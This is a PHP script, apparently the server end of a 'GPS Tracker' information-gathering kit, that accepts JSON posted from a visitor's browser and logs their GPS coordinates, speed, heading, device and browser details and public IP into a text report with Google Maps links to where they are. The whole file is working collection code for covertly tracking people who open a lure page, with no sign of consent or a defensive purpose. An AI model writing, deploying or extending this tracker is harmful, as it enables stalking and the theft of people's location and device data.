<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Set response header
header('Content-type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Get JSON data from request
$json = file_get_contents('php://input');
$data = json_decode($json, true);

// Log the raw input for debugging
file_put_contents('debug.log', date('Y-m-d H:i:s') . " - Raw Input: " . $json . "\n", FILE_APPEND);

if ($data && is_array($data)) {
    // Create beautiful formatted output
    $output = "\n";
    $output .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
    $output .= "GPS Tracker - Information Gathering Report\n";
    $output .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
    $output .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
    
    // GPS Location Information (MOST IMPORTANT)
    $output .= "📍 GPS LOCATION INFORMATION\n";
    $output .= "────────────────────────────────────────────────────────────\n";
    $output .= "Latitude: " . ($data['latitude'] ?? 'N/A') . "\n";
    $output .= "Longitude: " . ($data['longitude'] ?? 'N/A') . "\n";
    $output .= "Accuracy: " . ($data['accuracy'] ?? 'N/A') . " meters\n";
    $output .= "Altitude: " . ($data['altitude'] ?? 'N/A') . "\n";
    $output .= "Altitude Accuracy: " . ($data['altitudeAccuracy'] ?? 'N/A') . "\n";
    $output .= "Heading: " . ($data['heading'] ?? 'N/A') . "\n";
    $output .= "Speed: " . ($data['speed'] ?? 'N/A') . "\n";
    $output .= "Timestamp: " . ($data['timestamp'] ?? 'N/A') . "\n";
    
    // Generate Google Maps links
    if (isset($data['latitude']) && isset($data['longitude'])) {
        $lat = $data['latitude'];
        $lon = $data['longitude'];
        $output .= "\n🗺️  MAP LINKS:\n";
        $output .= "Google Maps: https://www.google.com/maps/place/" . $lat . "," . $lon . "\n";
        $output .= "Google Earth: https://earth.google.com/web/search/" . $lat . "," . $lon . "\n";
    }
    $output .= "────────────────────────────────────────────────────────────\n\n";
    
    // Device Information Section
    $output .= "💻 DEVICE INFORMATION\n";
    $output .= "────────────────────────────────────────────────────────────\n";
    $output .= "User Agent: " . ($data['userAgent'] ?? 'N/A') . "\n";
    $output .= "Platform: " . ($data['platform'] ?? 'N/A') . "\n";
    $output .= "Browser Language: " . ($data['language'] ?? 'N/A') . "\n";
    $output .= "Screen Resolution: " . ($data['screenResolution'] ?? 'N/A') . "\n";
    $output .= "CPU Cores: " . ($data['cpuCores'] ?? 'N/A') . "\n";
    $output .= "Device Memory: " . ($data['deviceMemory'] ?? 'N/A') . " GB\n";
    $output .= "Connection Type: " . ($data['connection'] ?? 'N/A') . "\n";
    
    // Parse browser name from user agent
    $userAgent = $data['userAgent'] ?? '';
    $browserName = 'Unknown';
    $browserCodeName = 'Mozilla';
    
    if (strpos($userAgent, 'Firefox') !== false) {
        $browserName = 'Firefox';
    } elseif (strpos($userAgent, 'Edg') !== false) {
        $browserName = 'Edge';
    } elseif (strpos($userAgent, 'Chrome') !== false) {
        $browserName = 'Chrome';
    } elseif (strpos($userAgent, 'Safari') !== false) {
        $browserName = 'Safari';
    }
    
    $output .= "Browser Name: " . $browserName . "\n";
    $output .= "Browser CodeName: " . $browserCodeName . "\n";
    
    // Parse OS from platform/user agent
    $platform = $data['platform'] ?? '';
    $os_cpu = 'Unknown';
    
    if (strpos($platform, 'Linux') !== false || strpos($userAgent, 'Linux') !== false) {
        $os_cpu = 'Linux x86_64';
    } elseif (strpos($platform, 'Win') !== false || strpos($userAgent, 'Windows') !== false) {
        $os_cpu = 'Windows';
    } elseif (strpos($platform, 'Mac') !== false || strpos($userAgent, 'Macintosh') !== false) {
        $os_cpu = 'MacOS';
    } elseif (strpos($userAgent, 'Android') !== false) {
        $os_cpu = 'Android';
    } elseif (strpos($userAgent, 'iPhone') !== false || strpos($userAgent, 'iPad') !== false) {
        $os_cpu = 'iOS';
    } else {
        $os_cpu = $platform;
    }
    
    $output .= "Operating System: " . $os_cpu . "\n";
    $output .= "Cookies Enabled: Yes\n";
    $output .= "────────────────────────────────────────────────────────────\n\n";
    
    // IP Information Section
    $output .= "🌐 NETWORK INFORMATION\n";
    $output .= "────────────────────────────────────────────────────────────\n";
    
    // Get IP from ip.txt if it exists
    $ip = 'N/A';
    if (file_exists('ip.txt')) {
        $ip_content = file_get_contents('ip.txt');
        if (preg_match('/IP:\s*([0-9.]+)/', $ip_content, $matches)) {
            $ip = $matches[1];
        }
    }
    $output .= "Public IP Address: " . $ip . "\n";
    $output .= "────────────────────────────────────────────────────────────\n\n";
    
    $output .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
    $output .= "End of Report\n";
    $output .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
    
    // Append to data.txt
    $result = file_put_contents('data.txt', $output, FILE_APPEND | LOCK_EX);
    
    if ($result === false) {
        file_put_contents('debug.log', date('Y-m-d H:i:s') . " - ERROR: Could not write to data.txt\n", FILE_APPEND);
        http_response_code(500);
        echo json_encode(['status' => 'error', 'message' => 'Could not write data']);
    } else {
        file_put_contents('debug.log', date('Y-m-d H:i:s') . " - SUCCESS: Data written to data.txt\n", FILE_APPEND);
        // Send success response
        echo json_encode([
            'status' => 'success', 
            'message' => 'Data received and saved',
            'bytes_written' => $result
        ]);
    }
} else {
    // Log error
    file_put_contents('debug.log', date('Y-m-d H:i:s') . " - ERROR: Invalid or empty data received\n", FILE_APPEND);
    
    // Send error response
    http_response_code(400);
    echo json_encode([
        'status' => 'error', 
        'message' => 'Invalid or empty data received',
        'received' => $json
    ]);
}
?>